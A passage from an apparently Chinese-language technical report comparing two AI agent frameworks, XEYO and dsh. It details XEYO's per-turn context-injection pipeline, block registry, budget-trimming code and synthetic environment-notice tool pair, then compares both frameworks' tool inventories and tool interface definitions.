| `env_channel`（默认） | 全部易变块装进一对**仅存于投影**的 `assistant(tool_use xeyo_env_notice) → tool_result` 伪对，尾插 | 作者原话（`:4-8`）：「tool_result 是模型训练出来的『环境数据声道』……不再与用户意图同层（**根治说话人混淆**）」 |
| `legacy` | 块以文本尾插末条 user | 回退档 |
| `skip` | 厂商以结构类 4xx 拒绝伪对时**宁可本轮不注入也不回落 legacy** | 保声道纯度 |

优先级：会话/请求显式 > `XEYO_T_NOW_STRATEGY` 环境变量 > 默认（`t_now_strategy.py:19-21, 54-62`）。声道常量 `ENV_TOOL_NAME = "xeyo_env_notice"`（`:110`）。

**硬准入四件套**（`pre_llm_inject.py:815-830`）：

```
T_NOW_BLOCK_HARD_CAP = 21     # 23→21：裁决 5 删掉 stale_xeyo_md / nested_change
T_NOW_BLOCK_REGISTRY: dict[str, dict[str, str]]   # 实测 20 条
T_NOW_TOTAL_BUDGET = 6000     # 总预算
T_NOW_INVENTORY_MAX = 2500    # inventory 类预算
```

三条规则写在代码注释里（`:818-824`）：① 每个装配点必须带标记且已登记；② 登记数硬顶 = 存量（加一必须删一，调高需在 commit message 给预算不破的理由）；③ 每条登记必须回答「为什么必须在上下文」，答不出的先问「**能不能不进上下文**」。

**执法方式本轮复核（比注释更强）**：装配点统一走 `_tag_block(tagged, "名", ...)`，测试直接断言**源码里不存在裸 `tagged.append(`**（仅助手本体允许一次），再正则提取全部 `_tag_block` 名做**双向核对**（`tests/test_t_now_block_registry.py`）：

```
test_hard_cap_not_exceeded                    # 登记数 ≤ 21
test_every_append_site_is_marked_and_registered  # 装配点全登记、无未登记名、无重复标记
test_registry_has_no_dead_entries             # 登记表不腐烂（每个登记名都能找到装配点）
test_registry_entries_are_complete            # klass 合法 + why 非空
```

即"改名/漏登记/登记不用"三种腐烂都有测试兜底——**登记名是真实代码参数，不是注释**。

**20 个块全清单**（`pre_llm_inject.py` 登记表 + 装配点，本轮实测）：

| # | 块名 | 类别 | 触发条件 |
|---|---|---|---|
| 1 | `continue` | directive | 工具续写轮（`ends_with_tool_result`） |
| 2 | `mode_instructions` | directive | Ask/Plan/批准计划模式合同 |
| 3 | `wrap_up` | directive | 预算/回合耗尽收尾窗 |
| 4 | `runtime_budget` | directive | 预算瞬时通知 |
| 5 | `budget_mirror` | directive | 仅墙钟死线会话每轮稳态镜像 |
| 6 | `multi_agent_hint` | directive | 多代理分解/汇总 |
| 7 | `repeat_guard` | directive | 轮内防复读（逐 submit 重置） |
| 8 | `nested_instructions` | inventory | 子目录 XEYO.md 按需加载 |
| 9 | `compact` | directive | 输出/写码压缩开关生效 |
| 10 | `mcp_required_warn` | event | required MCP 启动失败 |
| 11 | `reconcile_events` | event | 工具面/技能目录变更（drain） |
| 12 | `peer_presence` | event | 多会话交叉活动（drain） |
| 13 | `file_conflict` | event | 触碰文件被他会话写入 |
| 14 | `browser_preview` | inventory | 预览页 URL |
| 15 | `runtime_mode_snapshot` | directive | 审批模式活状态（supersedes） |
| 16 | `agent_settlement` | event | 子代理结算（drain） |
| 17 | `goal` | directive | 仅 blocked / pending_complete |
| 18 | `resume_directive` | event | 续跑富化指令（投影-only） |
| 19 | `pending_jobs` | directive | 后台 job 完成补投 |
| 20 | `skill_preinvoke` | directive | 用户 `/name` 直呼技能 |

装配入口 `run_pre_llm_inject`（`:1030-1358`）：按序 `_tag_block` → **类感知预算截断**（`_trim_tagged_blocks`，`:990-1027`）→ 按声道分流。另有一条注意力保护：**模糊指代轮整类静默 INVENTORY**（`:1312-1315`）。

###### 6.5.2 dsh：没有等价物

dsh 的易变内容只有两条去处：① `systemPrompt.context()` 的运行时快照（`SUPERSEDES` 语义，见 §6.1）；② `time-context` 插件 prepend 一条 user 消息（`time-context/src/index.ts:210-218`）。全仓 grep **无**块登记表、无硬顶、无白名单、无机器执法测试、无"伪造 tool 对"声道。

###### 6.5.3 设计分歧与判断

| 维度 | dsh | XEYO |
|---|---|---|
| 有没有"什么可以进上下文"的门 | **没有** | 有：登记表 + 硬顶 21 + 逐条理由 |
| 谁决定易变内容的位置 | 插件自己（section / context / prepend user） | 引擎统一收口到 T_now 管线 |
| 防说话人混淆 | 无此概念 | `env_channel` 伪造 tool 对 |
| 执法 | 无 | 4 条测试 + 禁用裸 append + 双向核对 |
| 代价 | 插件自由，但上下文可能被任意污染 | 引擎僵化，加一个块要删一个块 |

这是两种自由观的正面冲突：dsh 把"能不能往上下文塞东西"的权力**下放给插件作者**，只保留"塞了必须能重建"的底线；XEYO 把这条权力**收归引擎**，用硬顶和测试把"注意力预算"当成稀缺资源管理。dsh 的做法在生态繁荣后必然出问题（谁都能塞），XEYO 的做法在需要快速扩展时必然难受（加块要审批）。**两边都对，取决于你赌哪个未来。**

---


> 来源：**R3 实现面·实现级对比** · 原节「6. T_now 注入管线：实现级（XEYO 独有）」（源 L548–713）

##### 6. T_now 注入管线：实现级（XEYO 独有）

这是 XEYO 最独特的机制，本节写到字节级。

###### 6.1 四种策略与优先级

**文件**：`python/prompt/t_now_strategy.py`（133 行）

```python
STRATEGY_ENV_CHANNEL = "env_channel"   # 默认
STRATEGY_LEGACY = "legacy"             # 仅审计对照/显式评测档，不再自动回退
STRATEGY_SKIP = "skip"                 # 内部档：本轮不注入任何块
STRATEGY_PREFILL = "prefill"           # 预留，解析为 env_channel

def t_now_strategy() -> str:            # 显式 ContextVar > 环境变量 XEYO_T_NOW_STRATEGY > env_channel
def resolve_t_now_strategy(provider="", model="") -> str:
    s = t_now_strategy()
    if s == STRATEGY_PREFILL: s = STRATEGY_ENV_CHANNEL
    if s == STRATEGY_ENV_CHANNEL and env_channel_unsupported(env_unsupported_key(provider, model)):
        return STRATEGY_SKIP
    return s
```

**回落判定集合**（`:87`）：

```python
ENV_FALLBACK_STATUS = frozenset({400, 404, 405, 413, 415, 422})
```

注释明确排除 402（欠费）/429（限流）/5xx（瞬时）——「这些与消息结构无关，回退只会掩盖真实原因」。回落目标是 **skip 而不是 legacy**：`skip` 的 docstring 写「宁缺毋滥，不把引擎文本伪装成用户消息」，并声明「执行层硬约束（预算/回合/wrap 门）不依赖提示文本」。

**备忘是进程级的**（`:83` `_env_unsupported: set[str]`）：重启即重新尝试（`:82` 注释）。

###### 6.2 伪造 tool 对的字节级构造

**文件**：`python/prompt/turn_context.py:115-155`

```python
def append_env_notice_pair(messages: list[dict], text: str) -> list[dict]:
    t = (text or "").strip()
    if not messages or not t:
        return messages
    from prompt.t_now_strategy import ENV_TOOL_NAME, new_env_tool_call_id
    call_id = new_env_tool_call_id()
    pair = [
        {"role": "assistant", "content": [
            {"type": "tool_use", "id": call_id, "name": ENV_TOOL_NAME, "input": {}}]},
        {"role": "user", "content": [
            {"type": "tool_result", "tool_use_id": call_id, "content": t, "is_error": False}]},
    ]
    return [*messages, *pair]
```

**四个实现级要点**：
1. **内部格式是 Anthropic 形状**（`tool_use` / `tool_result` 块），经 `normalize_messages_for_openai` 转成 OpenAI 的 `assistant(tool_calls)` → `tool` 消息（docstring `:127-129` 明示）；
2. **copy-on-write**：`return [*messages, *pair]`，绝不改入参列表或既有消息对象（`:139` 注释）；
3. **绝不进 MessageStore / JSONL**（`:139`）；
4. 工具名 `xeyo_env_notice`（`t_now_strategy.py:110`）**不注册进 tools 数组**——docstring 解释「OpenAI 兼容厂商不校验历史 tool 名归属」，故 schemas 冻结红线不受影响。

**环境通知头（`:122-125`）**：

```python
ENV_NOTICE_HEADER = (
    "[system-environment]（XEYO 运行环境注入 — background only，非用户消息）\n"
    "以下是引擎注入的状态通知与背景信息。"
)
```

注释（`:118-121`）声明这是理念裁决的产物：**只做定义式来源声明，不写「按其中约束处理」类抬格指令**，且**契约测试断言不含「继续/按其中约束」等行为引导词**。拼装函数 `format_env_notice(blocks)` 用 `\n\n---\n\n` 分隔（`:128-133`）。

###### 6.3 20 块登记表 + 三层预算 + 机器执法

**文件**：`python/prompt/pre_llm_inject.py`（1387 行）

**登记表 20 条（实测）**，每条带 `klass` 与 `why`：

| # | 块名 | klass | 登记的「为什么必须在上下文」 |
|---|---|---|---|
| 1 | `continue` | directive | 工具续写轮无此块模型把 tool_result 当终点，不回用户问题 |
| 2 | `mode_instructions` | directive | Ask/Plan/批准计划是本轮行为模式合同，决定能否写盘 |
| 3 | `wrap_up` | directive | 收尾窗引导：配额内可落盘/验证但不得开新探索；缺口清单来自引擎 stat |
| 4 | `runtime_budget` | directive | 预算透明：模型需知剩余额度以决定收敛节奏 |
| 5 | `budget_mirror` | directive | 死线会话每轮稳态预算/时间镜像；正常会话零注入 |
| 6 | `multi_agent_hint` | directive | 多代理分解/汇总的协作合同，缺了会单干或重复汇总 |
| 7 | `repeat_guard` | directive | 轮内防复读提醒（引擎 clear_advice 逐轮重置） |
| 8 | `nested_instructions` | inventory | 子目录规则按需加载；限窗注入，滚出尾窗静默 |
| 9 | `compact` | directive | 输出/写码压缩开关生效的统一行为规则 |
| 10 | `mcp_required_warn` | event | required MCP server 启动失败的可见警告（fail-visible） |
| 11 | `reconcile_events` | event | 工具面/技能目录变更，consume 语义——静默即永久丢失 |
| 12 | `peer_presence` | event | 多会话交叉活动提醒，冲突预防（drain 队列） |
| 13 | `file_conflict` | event | 触碰文件被其他会话写入——静默即丢，覆盖风险 |
| 14 | `browser_preview` | inventory | 用户预览页 URL：读页面正文的必要指针 |
| 15 | `runtime_mode_snapshot` | directive | 审批模式活状态（supersedes）；真门禁在 permissions 层 |
| 16 | `agent_settlement` | event | 子代理结算通知，drain 语义——静默即永久丢失 |
| 17 | `goal` | directive | 仅 blocked/pending_complete 注入：恢复执行/完成确认的锚 |
| 18 | `resume_directive` | event | 续跑富化指令投影-only 送达；落库只存用户真实文本 |
| 19 | `pending_jobs` | directive | job 完成补投：一次性待领信息，模型不读则任务结果不可见 |
| 20 | `skill_preinvoke` | directive | 用户 /name 直呼技能的宿主确定性加载 |

**三层预算常量（实测）**：

```python
T_NOW_TOTAL_BUDGET    = 6_000   # :812  总量（字符）
T_NOW_INVENTORY_MAX   = 2_500   # :813  inventory 类配额
T_NOW_BLOCK_HARD_CAP  = 21      # :826  登记数硬顶（注释：23→21，裁决 5 删两块）
NESTED_MAX_CHARS      = 4_000   # :390  单块上限（nested）
_VAGUE_MAX_CHARS      = 24      # :946  模糊指代判定阈值
```

**20 条登记 vs 硬顶 21** —— 留了 1 格余量；注释要求「加一必须删一；显式调高需在 commit message 给出预算不破的理由」。

**装配点全部经 `_tag_block()`**（`:922-928`）：

```python
def _tag_block(tagged, name, block) -> None:
    """装配点统一入口：登记名进代码（执法测试解析对象）+ 块级旁路。"""
    if name in _skipped_blocks():
        return
    tagged.append(block)
```

`_skipped_blocks()`（`:917-919`）读 `XEYO_T_NOW_SKIP="a,b"` 做**块级消融**，注释警告「event 类（drain 语义）被跳过即永久丢失，消融跑分可接受，生产应急慎用」。

**类感知裁剪算法（完整实现，`:990-1026`）**：

```python
def _trim_tagged_blocks(tagged, *, total=T_NOW_TOTAL_BUDGET, inventory_max=T_NOW_INVENTORY_MAX):
    kept, inv = [], []
    used = 0
    for k, raw in tagged:
        b = (raw or "").strip()
        if not b: continue
        if k == KLASS_INVENTORY: inv.append((k, b))
        else:
            kept.append((k, b)); used += len(b)      # directive/event 全保
    room = max(0, min(inventory_max, total - used))  # inventory 拿剩余额度
    for k, b in inv:
        if room <= 0: break
        if len(b) <= room:
            kept.append((k, b)); room -= len(b)
        elif room >= 64:
            kept.append((k, b[:room].rstrip() + "…")); room = 0
        else:
            break
    return kept
```

三个实现级细节：**directive/event 不裁剪**（构造处各自有界）；**inventory 拿 `min(2500, 总量-已用)`**；**剩余不足 64 字符就整块丢弃**（不做无意义截断）。

**装配顺序（`run_pre_llm_inject` `:1030-1310`，实测 `_tag_block` 调用 20 处）**：continue → mode_instructions → wrap_up → (multi_agent_hint) → repeat_guard → nested_instructions → compact → mcp_required_warn → reconcile_events → peer_presence → file_conflict → browser_preview → runtime_mode_snapshot → agent_settlement → goal → (runtime_budget/budget_mirror) → pending_jobs → skill_preinvoke。

**执法测试（`tests/test_t_now_block_registry.py`）**第一问是「**能不能不进上下文**」，机器执法四件事：登记表与 `# block: <名>` 标记一一对应；**未登记即红**；**登记但不用也红**；**重复标记也红**。

###### 6.4 dsh 的对应物：没有 T_now，但有动态 context

dsh **没有**等价于 T_now 的机制——实测 48 个事件里没有「逐轮易变块」这一类。它最接近的东西是 `systemPrompt.context()` 注册的动态 context（§5.1），差异在实现层是三条：

1. **粒度**：dsh 是「每次 assembly 全量重渲染一份快照，正文声明 supersedes」；XEYO 是「20 个独立块，各自有 klass/预算/旁路开关」。
2. **预算**：dsh 无字符预算（靠 section 作者自控）；XEYO 有总 6000 / inventory 2500 / 单块 4000 三层。
3. **准入治理**：dsh 只要注册就能进；XEYO 有登记表 + 硬顶 + 机器执法 + 逐条理由。
4. **声道**：dsh 动态 context 就是真 user 消息；XEYO env_channel 用伪造 tool 对把引擎文本与用户意图在**消息结构上隔离**。

**判断**：这不是「dsh 缺一个功能」，而是**两端对「易变内容该不该进注意力」的答案不同**——dsh 把易变内容当 prompt 的一部分（有注册 API、无准入）；XEYO 把它当**治理对象**（登记、预算、理由、执法、旁路开关）。

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§6 T_now 注入管线：20 块逐块全文」（源 L645–791）

##### §6 T_now 注入管线：20 块逐块全文

###### 6.1 登记表（`python/prompt/pre_llm_inject.py::T_NOW_BLOCK_REGISTRY`）

**硬顶 `T_NOW_BLOCK_HARD_CAP = 21`**，注释写："23→21：裁决 5 删除 stale_xeyo_md / nested_change 两块（提醒类退出注意力，状态维护转引擎静默）"。

| # | 块名 | klass | why（原文） |
|---|---|---|---|
| 1 | `continue` | directive | 工具续写轮无此块模型把 tool_result 当终点，不回用户问题 |
| 2 | `mode_instructions` | directive | Ask/Plan/批准计划是本轮行为模式合同，决定能否写盘 |
| 3 | `wrap_up` | directive | 收尾窗引导:配额内可落盘/验证但不得开新探索;缺口清单来自引擎 stat |
| 4 | `runtime_budget` | directive | 预算透明：模型需知剩余额度以决定收敛节奏 |
| 5 | `budget_mirror` | directive | 死线会话每轮稳态预算/时间镜像（23ca693 禀赋①）；正常会话零注入，与 runtime_budget 瞬时通知互补 |
| 6 | `multi_agent_hint` | directive | 多代理分解/汇总的协作合同，缺了会单干或重复汇总 |
| 7 | `repeat_guard` | directive | 轮内防复读提醒（引擎 clear_advice 逐轮重置） |
| 8 | `nested_instructions` | inventory | 子目录规则按需加载；限窗注入，滚出尾窗静默 |
| 9 | `compact` | directive | 输出/写码压缩开关生效的统一行为规则（任一开关开启即注入；③合并两块减一） |
| 10 | `mcp_required_warn` | event | required MCP server 启动失败的可见警告（fail-visible） |
| 11 | `reconcile_events` | event | 工具面/技能目录变更，consume 语义——静默即永久丢失 |
| 12 | `peer_presence` | event | 多会话交叉活动提醒，冲突预防（drain 队列） |
| 13 | `file_conflict` | event | 触碰文件被其他会话写入——静默即丢，覆盖风险 |
| 14 | `browser_preview` | inventory | 用户预览页 URL：读页面正文的必要指针 |
| 15 | `runtime_mode_snapshot` | directive | 审批模式活状态（supersedes）；真门禁在 permissions 层 |
| 16 | `agent_settlement` | event | 子代理结算通知，drain 语义——静默即永久丢失 |
| 17 | `goal` | directive | 仅 blocked/pending_complete 注入：恢复执行/完成确认的锚 |
| 18 | `resume_directive` | event | 续跑富化指令投影-only 送达（修订2）：落库只存用户真实文本 |
| 19 | `pending_jobs` | directive | job 完成补投：一次性待领信息，模型不读则任务结果不可见 |
| 20 | `skill_preinvoke` | directive | 用户 /name 直呼技能的宿主确定性加载；不注入则直呼依赖模型自觉调 Skill 工具，user 只见技能的直呼即失效 |

**类别分布**：directive **12** / event **6** / inventory **2**。

###### 6.2 装配点（20 个 `_tag_block` 调用，与登记表一一对应）

`continue`(1045) / `mode_instructions`(1054) / `wrap_up`(1059) / `runtime_budget`(1063) / `multi_agent_hint`(1070) / `repeat_guard` / `nested_instructions` / `compact` / `mcp_required_warn` / `reconcile_events` / `peer_presence` / `file_conflict` / `browser_preview` / `runtime_mode_snapshot` / `agent_settlement` / `goal` / `resume_directive` / `pending_jobs` / `budget_mirror` / `skill_preinvoke`

**统一入口（`:922-930`）**

```python
def _tag_block(tagged, name, block) -> None:
    """装配点统一入口：登记名进代码（执法测试解析对象）+ 块级旁路。"""
    if name in _skipped_blocks():
        return
    tagged.append(block)
```

**块级旁路开关**：`XEYO_T_NOW_SKIP="a,b"`（消融/应急）。注释警告：**event 类被跳过即永久丢失**（consume 已清空）。

###### 6.3 三层预算（实测常量）

| 常量 | 值 | 用途 |
|---|---|---|
| `T_NOW_TOTAL_BUDGET` | **6,000** | 全块总预算（字符） |
| `T_NOW_INVENTORY_MAX` | **2,500** | inventory 类配额上限 |
| `T_NOW_EXTRA_BUDGET` | **6,000** | 额外预算 |
| `NESTED_MAX_CHARS` | **4,000** | 嵌套说明限窗 |
| `T_NOW_BLOCK_HARD_CAP` | **21** | 登记条数硬顶 |
| `KLASS_DIRECTIVE` / `KLASS_EVENT` / `KLASS_INVENTORY` | 字符串常量 | 类别标记 |

###### 6.4 裁剪算法逐行（`_trim_tagged_blocks:990-1027`）

```python
def _trim_tagged_blocks(tagged, *, total=T_NOW_TOTAL_BUDGET, inventory_max=T_NOW_INVENTORY_MAX):
    kept, inv = [], []
    used = 0
    for k, raw in tagged:
        b = (raw or "").strip()
        if not b: continue
        if k == KLASS_INVENTORY: inv.append((k, b))
        else:
            kept.append((k, b)); used += len(b)      # directive/event 全保
    room = max(0, min(inventory_max, total - used))  # inventory 配额 = min(2500, 6000-used)
    for k, b in inv:
        if room <= 0: break
        if len(b) <= room:
            kept.append((k, b)); room -= len(b)
        elif room >= 64:                              # ★ 剩余 ≥64 才截断
            kept.append((k, b[:room].rstrip() + "…")); room = 0
        else:
            break                                     # ★ 剩余 <64 整块丢弃
    return kept
```

**三条硬性质**：① directive/event **永不裁剪**（构造处各自有界）；② inventory 按装配序填配额；③ **末块剩余不足 64 字符则整块丢弃**（不是截成残句）。

###### 6.5 装配序（`run_pre_llm_inject:1030-…`）

`after_tools = ends_with_tool_result(out)` → 若为真先挂 `continue` → `mode_instructions`（`build_mode_context_blocks`）→ `wrap_up`（仅 `forced_wrap_up`）→ `runtime_budget`（仅 `ctx.runtime_notice`）→ `multi_agent_hint`（仅 `ctx.multi_agent`）→ …

###### 6.6 与 dsh 的对照

| 维度 | dsh | XEYO |
|---|---|---|
| 逐轮注入机制 | 无统一管线；各插件用 `createUserMessage({source:{kind:'plugin', plugin:…}})` 往 pre-step 加消息 | **T_now 单一管线** + 登记表 + 硬顶 |
| 声道 | 合成 user 消息（带 `source` 标记） | `env_channel`：伪造 tool 对（见 §7） |
| 预算 | 无全局预算（各插件自管） | 三层预算 6000/2500/21 |
| 登记/执法 | 无 | **20 块登记 + 硬顶 21 + 源码级执法测试** |
| 类别语义 | 无 | directive（全保）/ event（drain，静默即失）/ inventory（可裁） |
| 旁路 | 无 | `XEYO_T_NOW_SKIP` |

---

##### §7 `env_channel` 声道：逐字段

**实现**：`python/prompt/turn_context.py::append_env_notice_pair`（`:115` 起）

**产出结构（仅存在于投影的伪 tool 对）**

```python
pair = [
  {"role": "assistant",
   "content": [{"type": "tool_use", "id": call_id, "name": ENV_TOOL_NAME, "input": {}}]},
  {"role": "user",
   "content": [{"type": "tool_result", "tool_use_id": call_id, "content": t, "is_error": False}]},
]
return [*messages, *pair]
```

**逐字段语义**

| 字段 | 值 | 说明 |
|---|---|---|
| `role` | `"assistant"` → `"user"` | 内部格式；经 `normalize_messages_for_openai` 转成标准 `assistant(tool_calls)` → `tool` 消息 |
| `tool_use.name` | `ENV_TOOL_NAME`（`"xeyo_env_notice"`） | **不注册进 tools 数组** → schemas 冻结红线不受影响 |
| `tool_use.id` | `new_env_tool_call_id()` | 每次新建 |
| `tool_result.content` | 注入文本 | 环境声道载荷 |
| `tool_result.is_error` | `False` | 恒定 |

**关键不变量（原文）**

> tool_result 是模型训练出的「环境数据声道」——注入内容与用户意图在消息结构上隔离，说话人混淆无从发生。工具名（xeyo_env_notice）不注册进 tools 数组（schemas 冻结红线不受影响）；**尾部追加不改前缀字节，KV 缓存语义与 legacy 尾插等价**。

**另外两个同族函数**（同文件）

| 函数 | 行为 | 使用轮型 |
|---|---|---|
| `append_text_blocks_to_last_user` | 末条是 user 则**追加**到其 content；否则尾插新 user | after_tools 轮 |
| `prepend_text_blocks_to_last_user` | **前插**到末条 user 的文本之前（P1/A1 分仓） | 仅 fresh-user 轮 |
| `append_env_notice_pair` | 伪造 tool 对尾插 | env_channel 策略 |

**设计意图原文**：inventory/capability 类背景块放用户原文**之前**，理由是"生成点紧邻的永远是用户请求本身，recency 偏置为用户服务"；块自身靠围栏 + `background only — NOT the user request` 头防归属误读。

**渲染上限**：`APPROVED_PLAN_MAX_CHARS` 截断 + `\n…[plan truncated]`；approved plan 块结尾**只保留**"按已批准计划实现。"（裁决 4：引擎引导删除）。

**与 dsh 的对照**：dsh 没有等价声道设计；dsh 用 `MessageSource` 标记（`{kind:'plugin', plugin, form:'notice', summary}`）在**消息元数据**里区分来源，模型看到的是普通 user 消息。**XEYO 把隔离做进消息结构，dsh 把隔离做进元数据**——后者对模型是"作者标签"，前者对模型是"数据类型"。

---


## 域 09 · 工具系统（抽象 · 注册 · 生命周期）★重点样例

> 来源：**R1 功能面·全量对比** · 原节「8. 工具系统：逐工具对照」（源 L181–260）

##### 8. 工具系统：逐工具对照

###### 8.1 dsh 全量工具清单（`docs/tool-catalog.md`，生成物，`verify-tool-catalog` 执法）

| 工具 | 包 | 用途 |
|---|---|---|
| `bash` | `tool-bash` | POSIX shell 执行，支持 `run_in_background`、沙箱升级审批 |
| `pwsh` | `tool-pwsh` | PowerShell 方言（Windows 组合） |
| `bash` / `pwsh`（持久） | `tool-bash-persistent` / `tool-pwsh-persistent` | **PTY 持久会话**，状态跨调用保留 |
| `read` / `write` / `edit` / `read_image` | `tool-fs` | 文件读写 + 图片（需 `ctx.attachments` + 图像路由） |
| `glob` / `grep` | `tool-fs-search` | 直调打包的 ripgrep 二进制（经 `ctx.subprocess`，**不经 shell**） |
| `str_replace_editor` | `tool-str-replace-editor` | view/create/唯一字面替换/行插入（Anthropic 风格编辑器） |
| `terminal_open/close/read/send/signal/list` | `tool-terminal` | 6 个 PTY 终端工具（可选） |
| `todo_write` | `tool-todo` | 会话级清单，`todo/write` 事件，整体替换 |
| `exit_plan_mode` | `plan-mode` | 计划提交审批；**跨模式常驻**以保工具目录不变 |
| `ask_user_question` | `tool-ask-user` | 挂起等待人类回答 |
| `run_code` | `tools`（保留名） | **PTC 模式**：模型写程序编排多次工具调用，一次往返 |
| `skill` | `tool-skill` | 技能目录 + 加载 |
| `subagent` / `subagent_fork` | `tool-subagent` | 派生子代理（spawn / fork provider，可续聊） |
| `interrupt_agent`/`list_agents`/`send_message` | `tool-subagent-control` | 控制后台可续子代理 |
| `job_output`/`job_list`/`job_kill` | `tool-jobs` | 通用后台任务控制（bash 后台/PTY/子代理同一套） |
| `create_goal`/`get_goal`/`update_goal` | `tool-goal` | 同会话目标状态机 |
| `schedule_create`/`schedule_delete`/`schedule_list` | `schedule` | 定时（after_seconds / at / every_seconds） |
| `lsp` | `tool-lsp` | 语言服务器导航（provider 在 `ctx.lsp` 后） |
| `web_search` / `web_fetch` | `tool-web` | 检索/抓取（provider 在 `ctx.web` 后） |
| `workflow` | `tool-workflow` | 模型写 workflow 脚本，worker-thread 执行，含 agent/parallel/pipeline/phase/log |
| `ralph` | `tool-ralph` | 固定前台工作流，每轮一个结构化子代理，可选轮数上限 |
| `session_event_read`/`_search`/`_trace`、`session_search`/`session_trace` | `tool-session-query` | 读自己的会话历史（可选包） |
| `list_subagent_models` | `tool-subagent` | 子代理模型发现 |
| `cordis_define`/`_inspect_list`/`_inspect_query`/`_inspect_self`/`_run`/`_stop`/`_undefine` | `tool-cordis` | **自修改：模型定义并挂载自己的插件** |
| `interrupt_agent`/`list_agents`/`send_message`/`spawn_teammate`/`team_task_*`/`wait_agent` | `experimental-tool-agent-team` | Agent Teams（实验，默认禁用） |

**计：稳定产品工具 ≈ 45 个（含 7 个 cordis 自修改工具、6 个终端工具），实验组另 9 个。**

###### 8.2 XEYO 全量工具清单（`python/tools/meta.py:53-311` `TOOL_META`，实测 26 个）

`echo`、`getTime`、`offload_read`、`Glob`、`Grep`、`Read`、`Write`、`Edit`、`Bash`、`TodoWrite`、`Screenshot`、`SendToWeChat`、`Memory`、`AskUserQuestion`、`JournalQuery`、`Skill`、`Agent`、`Diagnostics`、`Git`、`NotebookEdit`、`WebFetch`、`WebSearch`、`XeyoUI`、`job_output`、`job_list`、`job_kill`。

###### 8.3 逐项映射

| 能力 | XEYO | dsh | 结论 |
|---|---|---|---|
| 读/写/编辑 | `Read`/`Write`/`Edit` | `read`/`write`/`edit` + `str_replace_editor` + `read_image` | dsh 多 2 个（图片读、Anthropic 风格编辑器） |
| 检索 | `Glob`/`Grep` | `glob`/`grep` | 对等（dsh 直调 ripgrep，XEYO 走 rg） |
| Shell | `Bash` | `bash` + `pwsh` + **持久 bash/pwsh** | dsh 多 pwsh 原生 + PTY 持久 |
| 终端 | **未见** | 6 个 terminal 工具 + `ctx.terminals` | **dsh 独有** |
| 后台任务 | `job_output/list/kill` | `job_output/list/kill` | 对等 |
| 任务清单 | `TodoWrite` | `todo_write` | 对等 |
| 提问 | `AskUserQuestion` | `ask_user_question` | 对等 |
| 计划模式 | `/plan` 斜杠命令 + `mode` + Plan 审批接口 | `exit_plan_mode` 工具 + `plan/mode` 事件 | 实现路径不同，能力对等 |
| 技能 | `Skill` | `skill` | 对等；dsh 分层注册表，XEYO 单目录 |
| 子代理 | `Agent` | `subagent` + `subagent_fork` + 3 个控制工具 | dsh 多控制面 + 多 provider（codex/claude-code/acp） |
| 目标 | 斜杠 `/goal` + `server/routers/goals.py` | `create_goal`/`get_goal`/`update_goal` 工具 + `goal/change` 事件 | dsh 模型可直接改目标；XEYO 偏人机命令 |
| 定时 | **未见**（有 `scheduler` DAG 但未接线） | `schedule_create/list/delete` | **dsh 独有（可用）** |
| 工作流脚本 | **未见** | `workflow` + `ralph` | **dsh 独有** |
| 代码执行（PTC） | **未见** | `run_code` + `ctx.codeRuntime` | **dsh 独有** |
| LSP | `Diagnostics`，源码注释明写 *"not a full LSP/IDE"*（`diagnostics_tool.py:1`） | `lsp` + `ctx.lsp` seam + `lsp-stdio` provider | **dsh 显著更强** |
| 网络 | `WebSearch`/`WebFetch` | `web_search`/`web_fetch` | 对等 |
| 会话历史查询 | `JournalQuery`（查 rewind 日志） | 5 个 session query 工具 | dsh 面更宽 |
| 记忆 | `Memory` + `memory/` 48 文件 | **未见**独立记忆工具（无 memory seam） | **XEYO 独有** |
| 桌面/UI 控制 | `XeyoUI` | 未见（`directoryPicker` 仅选目录） | **XEYO 独有** |
| 截图 | `Screenshot` | 未见 | **XEYO 独有** |
| 微信外发 | `SendToWeChat`（+ `channels/` 33 文件） | 未见 | **XEYO 独有** |
| Git 只读 | `Git` | 未见专用工具（走 bash） | **XEYO 独有（工具化）** |
| Notebook | `NotebookEdit` | 未见 | **XEYO 独有** |
| 自修改插件 | **未见** | 7 个 `cordis_*` 工具 | **dsh 独有** |
| Agent Teams | 有 `coord/` 工作池（feature-flag）+ 多会话 peer | experimental agent-team（默认禁） | 各有实现 |

###### 8.4 工具接口形状

| | XEYO | dsh |
|---|---|---|
| 定义 | `Tool` Protocol：`name/schema/execute/is_read_only/is_concurrency_safe`（`tools/base_tool.py:23-43`）+ `ToolMeta` 静态登记（`meta.py:25-28`） | `ToolDefinition extends ToolSchema`：`output{schema,render,presentationMeta?}`、`execute(args,exec)`、`finalizeContent?`、`timeoutMs?`、`isConcurrencySafe?`、`presentCall/presentResult`（`core/tools/src/index.ts:214-270`） |
| 参数 schema | dict 直写 JSON Schema | `defineTool` + 自研 DSL 编译为 JSON Schema（`schema.ts:545-617`） |
| 注册 | `registry.register()` 清 `_schemas_cache` | `ToolRuntime.register(definition)` 经 `layers.effect`（`index.ts:1028-1053`） |
| 超时 | **未见 per-tool 超时**；只有 `AbortController` | `timeoutMs` + `timeout-policy` 包装 `tools/execute`，超时替换为 `{code:'TOOL_TIMEOUT'}`（`guard/timeout-policy/src/index.ts:55-81`） |
| UI 呈现 | GUI 侧按 toolActivity 动态生成 | `presentCall`/`presentResult` + `meta` 持久化（host presenter 保持纯函数，Web 卡由原始事件派生） |

---


> 来源：**R2 设计面·设计级对比** · 原节「7. 工具系统（抽象 · 注册 · 生命周期）★重点样例」（源 L439–522）

##### 7. 工具系统（抽象 · 注册 · 生命周期）★重点样例

用户点名要以工具系统为例，所以这一节写到接口级。

###### 7.1 dsh：ToolDefinition = 行为 + 结构化输出 + UI 投影 + 超时

```ts
// packages/core/tools/src/index.ts:214-280
export interface ToolDefinition extends ToolSchema {
  readonly output: ToolOutputDefinition          // {schema, render, presentationMeta?}
  execute(args: unknown, exec: ToolRunContext): Promise<unknown>
  finalizeContent?(exec, result): ContentBlock[] | undefined
  timeoutMs?: number                              // 经 timeout-policy 包装，绝不下发模型
  isConcurrencySafe?(args): boolean
  presentCall?(args): ToolCallView | undefined
  presentResult?(args, result): ToolResultView | undefined
}
```

- **入参 schema**：自研 DSL `defineTool`（`schema.ts:545-617`）编译为 JSON Schema；execute 内 `validate` 失败抛 `ToolArgsError`。
- **结果类型**：`ToolResult {content, isError, meta?}`（`index.ts:283-295`）；**结构化输出**靠 `output.render(args, value)` 投影，`meta` 持久化进 `tool/result` 事件。
